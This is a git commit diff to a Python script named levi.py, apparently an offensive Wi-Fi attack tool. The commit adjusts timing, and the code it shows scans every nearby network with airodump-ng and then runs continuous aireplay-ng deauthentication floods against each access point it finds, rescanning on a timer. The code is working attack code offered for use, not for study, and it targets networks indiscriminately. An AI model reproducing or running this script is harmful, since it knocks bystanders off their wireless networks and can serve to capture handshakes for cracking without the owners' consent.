0171de2d87dd752e2a0b84520e31c4504eaeebd0
Levi <levgoolie@gmail.com>
2025-07-25 05:33:35 +1000

    Update levi.py

--- levi.py
+++ levi.py
@@ -14,22 +14,21 @@ monmode()
 
 def handshake():
  os.system("rm -rf pwn-01.csv")
- time.sleep(5)
  names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
  pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  os.system("clear")
- print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 7seconds...\033[0m")
- time.sleep(7) # um
+ print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 8seconds...\033[0m")
+ time.sleep(8) # um
  pwn.terminate()
  seen_essids = set()
  os.system("clear")
- threading.Timer(30, handshake).start()
- print("\nRESCANNING IN 30 SECONDS\n")
+ threading.Timer(60, handshake).start()
+ print("\nRESCANNING IN 60 SECONDS\n")
  print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
  print("\r                       ALL WIFIS TO ATTACK ")
  print("\r   ATTACKING")
  print("\r\033[0;33m -------------\r")
-  
+ time.sleep(3)
  with open("pwn-01.csv", "r") as read_csv:
     sec_read = csv.DictReader(read_csv, names)
     next(sec_read)
@@ -48,7 +47,7 @@ def handshake():
         time.sleep(0.022)
         term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         time.sleep(0.022)
-        time.sleep(10)
+        time.sleep(20)
         term.terminate()
         term2.terminate()
 
